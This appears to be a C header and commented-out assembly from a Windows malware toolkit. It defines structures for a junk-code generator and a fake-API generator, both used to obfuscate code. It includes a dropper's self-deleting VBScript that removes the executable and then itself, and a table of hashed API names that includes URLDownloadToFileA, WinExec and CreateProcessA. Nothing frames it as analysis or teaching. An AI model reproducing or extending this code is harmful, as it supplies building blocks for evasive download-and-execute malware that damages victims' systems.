#define		XTG_REALISTIC					1
#define		XTG_FUNC						1
#define		XTG_REALISTIC_WINAPI			2
#define		XTG_LOGIC						4
#define		XTG_DG_ON_XMASK					3
#define		XTG_VIRTUAL_ADDR				1
#define		XTG_OFFSET_ADDR					0

//xTG Engine Structure
typedef struct xtg_trash_gen {
	__in    DWORD32                         fmode;
	__in    DWORD32                         rang_addr;
	__in    DWORD32                         faka_addr;
	__in    DWORD32                         faka_struct_addr;
	__in    DWORD32                         xfunc_struct_addr;
	__in    DWORD32                         xdata_struct_addr;
	__in    DWORD32                         alloc_addr;
	__in    DWORD32                         free_addr;
	__in    DWORD32                         tw_trash_addr;
	__in    UINT32                          trash_size;
	__in    DWORD32                         xmask1;
	__in    DWORD32                         xmask2;
	__in    DWORD32                         fregs;
	__out   UINT32                          number_of_bytes_written;
	__out   DWORD32                         trash_oep;
	__out   DWORD32                         fnw_addr;
} XTG_TRASH_GEN, *PXTG_TRASH_GEN;

//FAKA Engine structure
typedef struct faka_fakeapi_gen {
	__in    DWORD32                         mapped_addr;
	__in    DWORD32                         rang_addr;
	__in    DWORD32                         alloc_addr;
	__in    DWORD32                         free_addr;
	__in    DWORD32                         xfunc_struct_addr;
	__in    DWORD32                         xdata_struct_addr;     
	__in    DWORD32                         tw_api_addr;
	__in    UINT32                          api_size;
	__in    DWORD32                         api_hash;
	__in    DWORD32                         api_va;
	__out   UINT32                          number_of_bytes_written;
	__out   DWORD32                         fnw_addr;  
} FAKA_FAKEAPI_GEN, *PFAKA_FAKEAPI_GEN;

//xTG Function Structure
typedef struct xtg_func_struct {
	__in    DWORD32                         func_addr;
	__in    UINT32                          func_size;
	__in    UINT32                          call_num;
	__in    UINT32                          local_num;
	__in    UINT32                          param_num;
} XTG_FUNC_STRUCT, *PXTG_FUNC_STRUCT;

//xTG Data Structure
typedef struct xtg_data_struct {
	__in    DWORD32                         xmask;
	__in    DWORD32                         rdata_addr;
	__in    UINT32                          rdata_size;
	__in    DWORD32                         rdata_pva;
	__in    DWORD32                         xdata_addr;
	__in    UINT32                          xdata_size;
	__in    UINT32                          number_of_bytes_written;
} XTG_DATA_STRUCT, *PXTG_DATA_STRUCT;

typedef struct xtg_main_struct {
	__in    PXTG_TRASH_GEN                  trash_gen_structure;
	__out   ERROR_CODE                      status;
} XTG_MAIN_STRUCT, *PXTG_MAIN_STRUCT;

/*
sc1_apop_string:
	db	'Wscript.Sleep 1000'
	db	0x0d
	db	0x0a
	db	'Dim g, f'
	db	0x0d
	db	0x0a
	db	'Set g = CreateObject("Scripting.FileSystemObject")'
	db	0x0d
	db	0x0a
	db	'Set f = g.GetFile("'
sc1_apop_string2:
	db	'")'
	db	0x0d
	db	0x0a
	db	'f.Delete'
	db	0x0d
	db	0x0a
	db	'Set o = CreateObject("Scripting.FileSystemObject")'
	db	0x0d
	db	0x0a
	db	'o.DeleteFile WScript.ScriptFullName'
	db	0x0d
	db	0x0a
	db	'Set o = Nothing'
	db	0x0d
	db	0x0a
	db	0x00
	*/

/*
	; Copy first part
	mov		esi, SC1_ENTRY_POINT
	lea		esi, [esi + sc1_apop_string - _start]
	mov		edi, esp
	mov		ecx, (sc1_apop_string2 - sc1_apop_string)
	rep		movsb

	; Get module file name
	sub		esp, MAX_PATH

	mov		eax, esp
	push	MAX_PATH
	push	eax
	push	0
	mov		eax, SC1_FGETMODULEFILENAME
	call	eax

	; Copy the file name
	push	edi
	lea		edi, [esp + 4]
	xor		eax, eax
	mov		ecx, eax
	not		ecx
	repne	scasb
	not		ecx
	
	pop		edi
	push	esi
	lea		esi, [esp + 4]
	rep		movsb

	dec		edi

	mov		esi, [esp]
	dec		ecx
	xor		al, al
	xchg	esi, edi
	repne	scasb

	not		ecx
	pop		edi
	xchg	esi, edi
	rep		movsb

	; Shift backwards towards the initial character
	sub		edi, 2
	xor		eax, eax
	mov		ecx, eax
	not		ecx
	std
	repne	scasb
	not		ecx

	mov		edx, edi
	add		edx, 2
	*/

/*
	; 3E07577B - LoadLibraryA
	db	07bh
	db	057h
	db	007h
	db	03eh

	; BB2D3AC0 - CreateProcessA
	db	0c0h
	db	03ah
	db	02dh
	db	0bbh

	; 395866BE - URLDownloadToFileA
	db	0beh
	db	066h
	db	058h
	db	039h

	; EDE19D36 - GetEnvironmentVariableA
	db	036h
	db	09dh
	db	0e1h
	db	0edh

	; 166CDD7B - CreateFileA
	db	07bh
	db	0ddh
	db	06ch
	db	016h

	; 15259404 - WriteFile
	db	004h
	db	094h
	db	025h
	db	015h

	; 6B548BA7 - DeleteFileA
	db	0a7h
	db	08bh
	db	054h
	db	06bh

	; D89D095A - ShellExecuteA 
	db	05ah
	db	009h
	db	09dh
	db	0d8h

	; E84033EE - CloseHandle
	db	0eeh
	db	033h
	db	040h
	db	0e8h

	; 0D3F81C9 - ExitProcess
	db	0c9h
	db	081h
	db	03fh
	db	00dh

	; AFC0A9F1 - GetModuleFileNameA
	db	0f1h
	db	0a9h
	db	0c0h
	db	0afh

	; 8819EEA9 - WinExec
	db	0a9h
	db	0eeh
	db	019h
	db	088h

	; F0F422CC - Sleep
	db	0cch
	db	022h
	db	0f4h
	db	0f0h
	*/